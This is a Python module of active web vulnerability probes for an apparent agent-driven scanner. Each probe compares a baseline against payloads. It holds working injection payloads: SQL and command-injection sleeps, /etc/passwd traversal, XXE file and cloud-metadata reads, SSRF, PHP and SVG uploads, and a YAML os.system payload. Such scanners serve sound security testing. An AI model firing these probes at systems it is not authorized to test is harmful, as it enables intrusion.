"""Active vulnerability probes - matched-pair, baseline-diffed checks.

Each probe sends a baseline plus payloads through the guarded client and
returns request_ids plus a structured verdict. A probe never claims a bug;
it reports a signal the agent confirms with its own requests.
"""
from __future__ import annotations

import json as _json
import random
import re
import string
import urllib.parse

from .registry import Context

SQL_ERRORS = re.compile(
    r"sql syntax|mysql|mariadb|sqlite3?|postgresql|pg_query|ORA-\d{4}|"
    r"odbc|jdbc|sqlstate|unclosed quotation|unterminated string|"
    r"syntax error.*sql|warning.*mysql|division by zero.*sql",
    re.I,
)
LFI_MARKERS = re.compile(
    r"root:x:0:0|daemon:|\[fonts\]|\[extensions\]|for 16-bit app support|"
    r"<\?php|BEGIN RSA PRIVATE KEY",
    re.I,
)


def _marker(prefix: str = "arg") -> str:
    return prefix + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def _inject(url: str, param: str, value: str) -> str:
    p = urllib.parse.urlparse(url)
    pairs = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    if not any(k == param for k, _ in pairs):
        pairs.append((param, ""))
    pairs = [(k, value if k == param else v) for k, v in pairs]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(pairs)))


def _inject_body(data: str, param: str, value: str) -> str:
    """Replace param's value inside a urlencoded or JSON body template."""
    try:
        obj = _json.loads(data)
        if isinstance(obj, dict):
            obj[param] = value  # append if absent, like the urlencoded path
            return _json.dumps(obj)
    except (ValueError, TypeError):
        pass
    pairs = urllib.parse.parse_qsl(data, keep_blank_values=True)
    if pairs:
        pairs = [(k, value if k == param else v) for k, v in pairs]
        if not any(k == param for k, _ in urllib.parse.parse_qsl(data)):
            pairs.append((param, value))
        return urllib.parse.urlencode(pairs)
    return data


def _send(ctx: Context, url: str, param: str, value: str,
          method: str = "GET", data: str | None = None,
          tool: str = "probe", note: str = ""):
    method = (method or "GET").upper()
    if method == "GET" or data is None:
        return ctx.client.send("GET", _inject(url, param, value), tool=tool, note=note)
    body = _inject_body(data, param, value)
    headers = {"Content-Type": "application/json"} if data.strip().startswith("{") \
        else {"Content-Type": "application/x-www-form-urlencoded"}
    return ctx.client.send(method, url, headers=headers, body=body, tool=tool, note=note)


def _similarity(a: str, b: str) -> float:
    """Cheap length+token similarity in [0,1]; enough for true/false diffs."""
    if a == b:
        return 1.0
    if not a or not b:
        return 0.0
    la, lb = len(a), len(b)
    length_sim = min(la, lb) / max(la, lb)
    ta, tb = set(re.findall(r"\w+", a)), set(re.findall(r"\w+", b))
    tok_sim = len(ta & tb) / max(len(ta | tb), 1)
    return round(0.4 * length_sim + 0.6 * tok_sim, 3)


# ---------------------------------------------------------------------------

def probe_reflection(ctx: Context, url: str, param: str,
                     method: str = "GET", data: str | None = None) -> dict:
    canary = _marker("x")
    payload = f"{canary}<>'\"&=/"
    res = _send(ctx, url, param, payload, method, data, tool="probe_reflection",
                note="xss canary")
    body = res.get("body", "")
    reflected = canary in body
    out = {"request_id": res["request_id"], "reflected": reflected}
    if not reflected:
        out["verdict"] = "not reflected"
        return out
    idx = body.find(canary)
    window = body[max(0, idx - 200): idx + 200]
    surviving = {c: c in window for c in "<>\"'&"}
    ctx_kind = "html"
    if re.search(r'<(?:script|style)[^>]*>[^<]*' + re.escape(canary), window, re.I):
        ctx_kind = "script/style"
    elif re.search(r'=\s*["\']?[^"\']*' + re.escape(canary), window):
        ctx_kind = "attribute"
    out.update({
        "verdict": "reflected",
        "context": ctx_kind,
        "unescaped_chars": [c for c, ok in surviving.items() if ok],
        "excerpt": window,
        "note": "context tells you the payload shape; unescaped < > \" ' means exploitable",
    })
    return out


def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
               data: str | None = None, json_body: bool = False) -> dict:
    tool = "probe_sqli"
    base = _send(ctx, url, param, "1", method, data, tool, "baseline")
    quote = _send(ctx, url, param, "1'", method, data, tool, "syntax probe")
    true_r = _send(ctx, url, param, "1' AND '1'='1", method, data, tool, "true")
    false_r = _send(ctx, url, param, "1' AND '1'='2", method, data, tool, "false")

    bodies = {k: r.get("body", "") for k, r in
              (("base", base), ("quote", quote), ("true", true_r), ("false", false_r))}
    error_hits = {k: m.group(0) for k, b in bodies.items()
                  if (m := SQL_ERRORS.search(b))}
    sim = _similarity(bodies["true"], bodies["false"])
    status_diff = true_r["status"] != false_r["status"]

    verdict, signal = "no signal", None
    if error_hits and "quote" in error_hits:
        verdict, signal = "error-based candidate", error_hits.get("quote")
    elif sim < 0.85 or status_diff:
        verdict = "boolean-blind candidate"
        signal = f"true/false similarity={sim}, statuses {true_r['status']}/{false_r['status']}"
    return {
        "verdict": verdict,
        "signal": signal,
        "request_ids": {k: r["request_id"] for k, r in
                        (("base", base), ("quote", quote),
                         ("true", true_r), ("false", false_r))},
        "error_markers": error_hits,
        "true_false_similarity": sim,
        "note": "confirm before record_finding: reproduce the difference and quote the differing bytes",
    }


def probe_time(ctx: Context, url: str, param: str, method: str = "GET",
               data: str | None = None, delay_s: int = 4) -> dict:
    delay_s = max(2, min(int(delay_s or 4), 10))
    tool = "probe_time"
    b1 = _send(ctx, url, param, "1", method, data, tool, "baseline-1")
    b2 = _send(ctx, url, param, "2", method, data, tool, "baseline-2")
    baseline = max(b1["elapsed_ms"], b2["elapsed_ms"])
    threshold = baseline + delay_s * 700  # 70% of requested delay above baseline

    payloads = [
        ("mysql", f"1' AND SLEEP({delay_s})-- -"),
        ("postgres", f"1' AND pg_sleep({delay_s})-- -"),
        ("mssql", f"1'; WAITFOR DELAY '0:0:{delay_s}'-- -"),
        ("cmd-unix", f"1; sleep {delay_s}"),
        ("cmd-pipe", f"1|sleep {delay_s}"),
        ("cmd-subst", f"1$(sleep {delay_s})"),
    ]
    hits, results = [], []
    for family, payload in payloads:
        r = _send(ctx, url, param, payload, method, data, tool, family)
        slow = r["elapsed_ms"] >= threshold
        results.append({"family": family, "elapsed_ms": r["elapsed_ms"],
                        "slow": slow, "request_id": r["request_id"]})
        if slow:
            hits.append(family)
    return {
        "verdict": "time-based candidate: " + ", ".join(hits) if hits else "no delay observed",
        "baseline_ms": baseline,
        "threshold_ms": round(threshold, 1),
        "results": results,
        "note": "repeat a slow family once to rule out noise before recording a finding",
    }


_SSTI_TEMPLATES = [
    ("jinja2/twig", "{{%d+%d}}"),
    ("erb/ejs", "<%%= %d+%d %%>"),
    ("freemarker/velocity", "${%d+%d}"),
    ("thymeleaf/spring", "${{%d+%d}}"),
]


def probe_ssti(ctx: Context, url: str, param: str, method: str = "GET",
               data: str | None = None) -> dict:
    base = _send(ctx, url, param, _marker("s"), method, data, "probe_ssti", "baseline")
    # a random arithmetic sum is virtually never present naturally -
    # the classic "49" from {{7*7}} collides with dates/ids everywhere
    a, b = random.randint(10000, 89999), random.randint(1000, 8999)
    expect = str(a + b)
    hits = []
    for family, tpl in _SSTI_TEMPLATES:
        payload = tpl % (a, b)
        r = _send(ctx, url, param, payload, method, data, "probe_ssti", family)
        body = r.get("body", "")
        if expect in body and payload not in body:
            hits.append({"family": family, "request_id": r["request_id"],
                         "evidence": f"{payload} -> {expect} in response"})
        elif payload in body:
            hits.append({"family": family, "request_id": r["request_id"],
                         "evidence": "reflected unrendered (not SSTI)", "negative": True})
    return {
        "verdict": ("ssti candidate: " + "; ".join(h["evidence"] for h in hits if not h.get("negative")))
        if any(not h.get("negative") for h in hits) else "no template evaluation",
        "baseline_id": base["request_id"],
        "results": hits,
    }


def probe_lfi(ctx: Context, url: str, param: str) -> dict:
    payloads = [
        ("etc-passwd-trav", "../../../../../../etc/passwd"),
        ("etc-passwd-abs", "/etc/passwd"),
        ("etc-passwd-enc", "....//....//....//etc/passwd"),
        ("win-ini", "..\\..\\..\\..\\windows\\win.ini"),
        ("nullbyte", "../../../../../../etc/passwd%00"),
    ]
    hits, results = [], []
    for name, payload in payloads:
        r = _send(ctx, url, param, payload, "GET", None, "probe_lfi", name)
        m = LFI_MARKERS.search(r.get("body", ""))
        results.append({"name": name, "status": r["status"],
                        "request_id": r["request_id"],
                        "marker": m.group(0) if m else None})
        if m:
            hits.append({"name": name, "marker": m.group(0),
                         "request_id": r["request_id"]})
    return {
        "verdict": ("lfi confirmed marker: " + ", ".join(h["marker"] for h in hits))
        if hits else "no file content markers",
        "results": results,
    }


def probe_redirect(ctx: Context, url: str, param: str) -> dict:
    dest = "https://example.org/argus-canary"
    r = _send(ctx, url, param, dest, "GET", None, "probe_redirect", "external dest")
    loc = (r.get("headers") or {}).get("location", "")
    open_r = r["status"] in (301, 302, 303, 307, 308) and "example.org" in loc
    return {
        "verdict": "open redirect" if open_r else "not redirected to external host",
        "request_id": r["request_id"],
        "status": r["status"],
        "location": loc,
    }


def probe_cors(ctx: Context, url: str) -> dict:
    evil = "https://argus-probe.invalid"
    r = ctx.client.send("GET", url, headers={"Origin": evil},
                        tool="probe_cors", note="foreign origin")
    h = {k.lower(): v for k, v in (r.get("headers") or {}).items()}
    acao = h.get("access-control-allow-origin", "")
    acac = h.get("access-control-allow-credentials", "")
    reflected = acao == evil or acao == "*"
    credentialed = acac.lower() == "true"
    verdict = "no cors issue"
    if reflected and credentialed:
        verdict = "arbitrary origin reflection WITH credentials - exploitable"
    elif acao == "*":
        verdict = "wildcard ACAO (no credentials)" if not credentialed else "wildcard + credentials"
    elif reflected:
        verdict = "origin reflected without credentials"
    return {"verdict": verdict, "request_id": r["request_id"],
            "acao": acao, "acac": acac}


def probe_method(ctx: Context, url: str) -> dict:
    r = ctx.client.send("OPTIONS", url, tool="probe_method", note="options")
    h = {k.lower(): v for k, v in (r.get("headers") or {}).items()}
    allow = h.get("allow") or h.get("access-control-allow-methods", "")
    out = {"options_id": r["request_id"], "status": r["status"], "allow": allow}
    dangerous = [m for m in ("PUT", "DELETE", "TRACE", "CONNECT")
                 if m in allow.upper()]
    if "PUT" in allow.upper():
        canary = _marker("put")
        p = ctx.client.send("PUT", url.rstrip("/") + f"/{canary}.txt",
                            body="argus method probe", tool="probe_method",
                            note="PUT canary")
        out["put_attempt"] = {"status": p["status"], "request_id": p["request_id"]}
        if p["status"] in (200, 201, 204):
            g = ctx.client.send("GET", url.rstrip("/") + f"/{canary}.txt",
                                tool="probe_method", note="verify PUT")
            out["put_verified"] = canary in g.get("body", "")
            out["put_verify_id"] = g["request_id"]
            if out["put_verified"]:
                ctx.client.send("DELETE", url.rstrip("/") + f"/{canary}.txt",
                                tool="probe_method", note="cleanup canary")
    out["dangerous_methods"] = dangerous
    out["verdict"] = ("writable method confirmed" if out.get("put_verified")
                      else f"methods: {allow or 'none advertised'}")
    return out


_ID_RE = re.compile(r"(?<![\w.-])(\d{1,12})(?![\w.-])")


def probe_idor(ctx: Context, url: str) -> dict:
    """IDOR matched-pair: fetch the object, then the same URL with the
    numeric id +/-1. A different object at the same access level means
    access control is per-object (or missing)."""
    p = urllib.parse.urlparse(url)
    where, target = "path", p.path
    m = _ID_RE.search(target)
    if not m:
        where, target = "query", p.query
        m = _ID_RE.search(target)
    if not m:
        return {"error": "no numeric id found in url; pass e.g. "
                         "/item?id=7 or /user/42/profile"}
    base = ctx.client.send("GET", url, tool="probe_idor", note="own object")

    def _shift(delta: int) -> dict:
        new_id = str(int(m.group(1)) + delta)
        comp = target[:m.start(1)] + new_id + target[m.end(1):]
        u2 = urllib.parse.urlunparse(
            p._replace(**{where: comp}))
        return ctx.client.send("GET", u2, tool="probe_idor",
                               note=f"id {new_id} (id{delta:+d})")

    neighbors = [_shift(d) for d in (1, -1)]
    results = []
    for r in neighbors:
        other = r.get("body", "")
        sim = _similarity(other, base.get("body", ""))
        results.append({"request_id": r["request_id"], "status": r["status"],
                        "similarity_to_base": sim,
                        "accessible": r["status"] == 200})
    ok = [r for r in results if r["accessible"]]
    verdict = "no other object accessible"
    if ok and all(r["similarity_to_base"] < 0.98 for r in ok):
        verdict = ("idor candidate: neighboring object ids return 200 with "
                   "different content - verify the object isn't yours")
    elif ok:
        verdict = ("neighbors accessible but content ~identical - check "
                   "whether ids even select an object")
    return {"verdict": verdict, "base_id": base["request_id"],
            "results": results,
            "note": "confirm before recording: the second object must belong "
                    "to a different principal (name/id inside the body)"}


_SSRF_MARKERS = re.compile(
    r"ami-id|instance-id|local-hostname|local-ipv4|security-credentials|"
    r"computeMetadata|Metadata-Flavor|XAwsEc2|iam/info",
    re.I,
)


def probe_ssrf(ctx: Context, url: str, param: str) -> dict:
    """SSRF matched-pair: baseline is an unresolvable canary host, then
    internal URLs (self-fetch on the target's own port, loopback name,
    cloud metadata). A 200 whose body differs from the canary error - with
    the injected URL itself stripped out - is the signal."""
    p = urllib.parse.urlparse(url)
    port = p.port or (443 if p.scheme == "https" else 80)
    canary = f"http://{_marker('nrf')}.invalid/"
    base = _send(ctx, url, param, canary, tool="probe_ssrf",
                 note="unresolvable canary")
    base_body = (base.get("body") or "").replace(canary, "")

    payloads = [
        ("self-fetch", f"http://127.0.0.1:{port}/"),
        ("loopback-name", f"http://localhost:{port}/"),
        ("cloud-metadata", "http://169.254.169.254/latest/meta-data/"),
    ]
    hits = []
    for name, target in payloads:
        r = _send(ctx, url, param, target, tool="probe_ssrf", note=name)
        body = r.get("body") or ""
        marker = _SSRF_MARKERS.search(body)
        sim = _similarity(body.replace(target, ""), base_body)
        hits.append({
            "name": name, "target": target, "status": r["status"],
            "request_id": r["request_id"],
            "similarity_to_canary": sim,
            "marker": marker.group(0) if marker else None,
            "differs": sim < 0.75 or r["status"] != base["status"],
        })
    strong = next((h for h in hits if h["marker"]), None)
    cand = next((h for h in hits if h["differs"] and h["status"] == 200), None)
    if strong:
        verdict = ("ssrf candidate: internal-content marker "
                   f"'{strong['marker']}' in response to {strong['name']}")
    elif cand:
        verdict = ("ssrf lead: internal URL returned 200 with different "
                   f"content than the canary ({cand['name']}) - confirm "
                   "the fetched body is really server-side output")
    else:
        verdict = "no ssrf signal"
    return {"verdict": verdict, "canary_id": base["request_id"],
            "results": hits}


def probe_xxe(ctx: Context, url: str) -> dict:
    """XXE matched-pair: baseline is a plain XML POST, then doctype
    payloads declaring external entities (local file, cloud metadata).
    File/metadata bytes in the echoed body are the signal."""
    hdr = {"Content-Type": "application/xml"}
    base = ctx.client.send("POST", url, headers=hdr,
                           body="<r>argus</r>", tool="probe_xxe",
                           note="plain xml baseline")
    payloads = [
        ("file-read",
         '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
         '"file:///etc/passwd">]><r>&xxe;</r>'),
        ("file-read-win",
         '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
         '"file:///c:/windows/win.ini">]><r>&xxe;</r>'),
        ("ssrf-via-xxe",
         '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
         '"http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>'),
    ]
    hits = []
    for name, doc in payloads:
        r = ctx.client.send("POST", url, headers=hdr, body=doc,
                            tool="probe_xxe", note=name)
        body = r.get("body") or ""
        lfi = LFI_MARKERS.search(body)
        meta = _SSRF_MARKERS.search(body)
        hits.append({"name": name, "status": r["status"],
                     "request_id": r["request_id"],
                     "marker": (lfi or meta).group(0) if (lfi or meta) else None,
                     "similarity_to_base": _similarity(
                         body, base.get("body") or "")})
    strong = next((h for h in hits if h["marker"]), None)
    if strong:
        verdict = (f"xxe candidate: marker '{strong['marker']}' resolved "
                   f"inside the XML response ({strong['name']})")
    else:
        verdict = "no xxe signal"
    return {"verdict": verdict, "base_id": base["request_id"],
            "results": hits}


_FORM_RE = re.compile(r"<form[^>]*>", re.I)
_INPUT_RE = re.compile(r"<input[^>]*>", re.I)
_CSRF_TOKEN_RE = re.compile(r"csrf|xsrf|token|nonce|authenticity|_key", re.I)


def _forms(html: str) -> list[dict]:
    """Minimal form inventory: method, action, hidden input names."""
    forms = []
    for m in _FORM_RE.finditer(html):
        tag = m.group(0)
        method = re.search(r'method=["\']?(\w+)', tag, re.I)
        action = re.search(r'action=["\']([^"\']*)', tag, re.I)
        end = html.find("</form>", m.end())
        seg = html[m.end(): end if end > 0 else len(html)]
        hidden = []
        for itag in _INPUT_RE.finditer(seg):
            t = re.search(r'type=["\']?(\w+)', itag.group(0), re.I)
            nm = re.search(r'name=["\']([^"\']+)', itag.group(0), re.I)
            if nm and (not t or t.group(1).lower() == "hidden"):
                hidden.append(nm.group(1))
        forms.append({"method": method.group(1).upper() if method else "GET",
                      "action": action.group(1) if action else "",
                      "hidden": hidden})
    return forms


def probe_csrf(ctx: Context, url: str) -> dict:
    """CSRF surface check: POST forms without anti-CSRF tokens plus
    session cookies missing SameSite=Lax/Strict."""
    r = ctx.client.send("GET", url, tool="probe_csrf", note="form inventory")
    body = r.get("body") or ""
    forms = _forms(body)
    post_forms = [f for f in forms if f["method"] == "POST"]
    unprotected = [f for f in post_forms
                   if not any(_CSRF_TOKEN_RE.search(n) for n in f["hidden"])]
    sc = (r.get("headers") or {}).get("set-cookie") or []
    if isinstance(sc, str):
        sc = [sc]
    weak_cookies = [c.split("=", 1)[0] for c in sc
                    if "samesite" not in c.lower()]
    if not post_forms:
        verdict = "no state-changing forms"
    elif not unprotected:
        verdict = "post forms carry anti-csrf tokens"
    elif weak_cookies:
        verdict = ("csrf candidate: POST form(s) lack anti-CSRF token and "
                   "session cookies lack SameSite -> "
                   + ", ".join(f["action"] or "?" for f in unprotected))
    else:
        verdict = ("csrf lead: POST form(s) lack anti-CSRF token; no "
                   "session cookie seen - confirm auth is cookie-based")
    return {"verdict": verdict, "request_id": r["request_id"],
            "post_forms": post_forms, "unprotected": unprotected,
            "weak_cookies": weak_cookies}


def probe_xfh(ctx: Context, url: str) -> dict:
    """Host-header poisoning: X-Forwarded-Host canary reflected into the
    body or Location means generated absolute links can be attacker-aimed
    (password-reset poisoning, cache poisoning)."""
    canary = f"{_marker('xfh')}.argus.invalid"
    r = ctx.client.send("GET", url, headers={"X-Forwarded-Host": canary},
                        tool="probe_xfh", note="xfh canary")
    body = r.get("body") or ""
    loc = (r.get("headers") or {}).get("location", "")
    if isinstance(loc, list):
        loc = " ".join(loc)
    where = ("Location" if canary in loc
             else "body" if canary in body else "")
    verdict = (f"host-header candidate: X-Forwarded-Host reflected in {where}"
               if where else "no host-header reflection")
    return {"verdict": verdict, "request_id": r["request_id"],
            "canary": canary, "reflected_in": where}


def probe_nosqli(ctx: Context, url: str, data: str, param: str) -> dict:
    """NoSQL operator injection matched-pair: baseline JSON body, then the
    same body with the param replaced by $ne/$gt/$regex operator objects.
    A status/body flip means the server evaluated the operator."""
    hdr = {"Content-Type": "application/json"}
    try:
        template = _json.loads(data)
    except ValueError:
        return {"error": "data must be a JSON object, e.g. "
                         '{"username":"x","password":"y"}'}
    if not isinstance(template, dict):
        return {"error": "data must be a JSON object"}
    base = ctx.client.send("POST", url, headers=hdr, body=data,
                           tool="probe_nosqli", note="json baseline")
    operators = [{"$ne": None}, {"$gt": ""}, {"$regex": ".*"}]
    hits = []
    for op in operators:
        doc = dict(template)
        doc[param] = op
        r = ctx.client.send("POST", url, headers=hdr,
                            body=_json.dumps(doc), tool="probe_nosqli",
                            note=f"operator {next(iter(op))}")
        sim = _similarity(r.get("body") or "", base.get("body") or "")
        hits.append({"op": next(iter(op)), "status": r["status"],
                     "request_id": r["request_id"],
                     "similarity_to_base": sim,
                     "differs": r["status"] != base["status"] or sim < 0.7})
    flip = next((h for h in hits if h["differs"]), None)
    verdict = ("nosqli candidate: operator payload flipped the response "
               f"({flip['op']} status {flip['status']} vs baseline "
               f"{base['status']})" if flip else "no nosqli signal")
    return {"verdict": verdict, "base_id": base["request_id"],
            "results": hits}


def probe_upload(ctx: Context, url: str) -> dict:
    """Unrestricted-upload check: a benign control plus active-content
    files; the stored file being served back with bytes intact is the
    signal (stored XSS / webshell depending on stack)."""
    canary = _marker("upl")

    def _multipart(fname: str, ctype: str, content: str):
        b = "----argus" + canary
        body = (f"--{b}\r\nContent-Disposition: form-data; name=\"file\"; "
                f"filename=\"{fname}\"\r\nContent-Type: {ctype}\r\n\r\n"
                f"{content}\r\n--{b}--\r\n")
        return body, {"Content-Type": f"multipart/form-data; boundary={b}"}

    payloads = [
        ("control-txt", f"{canary}.txt", "text/plain", canary),
        ("svg-xss", f"{canary}.svg", "image/svg+xml",
         '<svg xmlns="http://www.w3.org/2000/svg">'
         f"<script>/*{canary}*/alert(1)</script></svg>"),
        ("php-rce", f"{canary}.php", "application/x-php",
         f"<?php /*{canary}*/ echo 'x'; ?>"),
    ]
    results = []
    for name, fname, ctype, content in payloads:
        body, hdr = _multipart(fname, ctype, content)
        up = ctx.client.send("POST", url, headers=hdr, body=body,
                             tool="probe_upload", note=name)
        entry = {"name": name, "status": up["status"],
                 "request_id": up["request_id"], "served": False}
        m = re.search(r'"(?:url|path|location|file)"\s*:\s*"([^"]+)"',
                      up.get("body") or "")
        if m:
            entry["stored_path"] = m.group(1)
            g = ctx.client.send("GET",
                                urllib.parse.urljoin(url, m.group(1)),
                                tool="probe_upload", note=f"fetch {name}")
            entry["fetch_id"] = g["request_id"]
            entry["served"] = canary in (g.get("body") or "")
        results.append(entry)
    served = [r for r in results if r["served"]]
    active = [r for r in served if r["name"] != "control-txt"]
    if active:
        verdict = ("upload candidate: active file type stored and served "
                   f"({', '.join(r['name'] for r in active)}) - stored "
                   "XSS or code execution depending on server stack")
    elif served:
        verdict = ("uploads are stored and served; active types blocked "
                   "or undisclosed - try extensions/content manually")
    else:
        verdict = "no upload accepted or stored path undisclosed"
    return {"verdict": verdict, "results": results}


def probe_race(ctx: Context, url: str, method: str = "GET",
               data: str | None = None, n: int = 8) -> dict:
    """TOCTOU / limit-exceeded check: fire n concurrent identical
    requests. If a presumed one-time action (redeem, vote, transfer)
    reports success more than once, the guard window raced.

    Sends still respect the shared rate limiter - for true wire
    concurrency run with a high --rate or no cap."""
    import concurrent.futures

    def _fire() -> dict:
        return ctx.client.send(method, url, body=data,
                               tool="probe_race", note="concurrent burst")

    n = max(2, min(int(n or 8), 16))
    with concurrent.futures.ThreadPoolExecutor(max_workers=n) as ex:
        rs = list(ex.map(lambda _: _fire(), range(n)))
    statuses: dict[int, int] = {}
    for r in rs:
        statuses[r["status"]] = statuses.get(r["status"], 0) + 1
    ok = [r for r in rs if 200 <= r["status"] < 300]
    if len(ok) > 1:
        verdict = (f"race candidate: {len(ok)}/{n} concurrent requests "
                   "succeeded - if the action is one-time it executed "
                   f"{len(ok)}x; confirm by checking server-side state")
    elif len(ok) == 1:
        verdict = ("single success in burst - no race window observed "
                   "(or the action was already consumed)")
    else:
        verdict = ("no success in burst; statuses "
                   f"{statuses} - endpoint may not be one-time")
    return {"verdict": verdict, "statuses": statuses,
            "results": [{"status": r["status"],
                         "request_id": r["request_id"]} for r in rs]}


_DESER_ERRORS = re.compile(
    r"ObjectInputStream|InvalidClassException|ClassNotFoundException|"
    r"StreamCorruptedException|unserialize|__wakeup|Unpickler|"
    r"pickle\.loads|cannot deserialize|SerializationException|"
    r"yaml_parse|marshal\.load|BinaryFormatter|JsonSerializer",
    re.I,
)


def probe_deserialize(ctx: Context, url: str, param: str) -> dict:
    """Deserialization surface check: baseline then magic-bytes payloads
    per ecosystem. A framework deserialization error means the parser
    actually processes the field - real attack surface, not a guess."""
    base = _send(ctx, url, param, "argus-plain", tool="probe_deserialize",
                 note="baseline")
    base_err = _DESER_ERRORS.search(base.get("body") or "")
    payloads = [
        ("java-b64", "rO0ABXQABHRlc3Q="),
        ("php-object", 'O:8:"stdClass":0:{}'),
        ("php-array", 'a:1:{s:1:"a";s:1:"b";}'),
        ("python-pickle", "c__builtin__\nset\n"),
        ("node-serialize", '{"x":"_$$ND_FUNC$$_function(){return 1}()"}'),
        ("yaml-python", "!!python/object/apply:os.system ['id']"),
        ("dotnet-psobject", '{"$type":"System.Object"}'),
    ]
    hits = []
    for name, pl in payloads:
        r = _send(ctx, url, param, pl, tool="probe_deserialize", note=name)
        body = r.get("body") or ""
        m = _DESER_ERRORS.search(body)
        hits.append({"name": name, "status": r["status"],
                     "request_id": r["request_id"],
                     "marker": m.group(0) if m else None})
    strong = next((h for h in hits if h["marker"]
                   and h["marker"] != (base_err.group(0) if base_err else None)),
                  None)
    if strong:
        verdict = ("deserialization surface: parser error "
                   f"'{strong['marker']}' on {strong['name']} payload - "
                   "the field reaches a deserializer")
    elif any(h["marker"] for h in hits):
        verdict = "deserializer errors seen but also at baseline"
    else:
        verdict = "no deserialization signal"
    return {"verdict": verdict, "base_id": base["request_id"],
            "results": hits}


def probe_cache(ctx: Context, url: str) -> dict:
    """Cache-poisoning check: poison attempt via unkeyed X-Forwarded-Host,
    then a clean fetch - poisoned bytes served to the clean request means
    the header is unkeyed input into a shared cache."""
    c1, c2 = f"{_marker('cp')}.invalid", f"{_marker('cq')}.invalid"
    ctx.client.send("GET", url, headers={"X-Forwarded-Host": c1},
                    tool="probe_cache", note="poison attempt")
    clean = ctx.client.send("GET", url, tool="probe_cache",
                            note="clean fetch")
    refl = ctx.client.send("GET", url, headers={"X-Forwarded-Host": c2},
                           tool="probe_cache", note="reflection check")
    clean_body = clean.get("body") or ""
    refl_body = refl.get("body") or ""
    if c1 in clean_body:
        verdict = ("cache-poisoning candidate: unkeyed X-Forwarded-Host "
                   "persisted into a response served to a clean request")
    elif c2 in refl_body:
        verdict = ("X-Forwarded-Host reflected but not cached - header "
                   "is likely keyed or no shared cache")
    else:
        verdict = "no cache/xfh signal"
    return {"verdict": verdict, "clean_id": clean["request_id"],
            "reflect_id": refl["request_id"]}
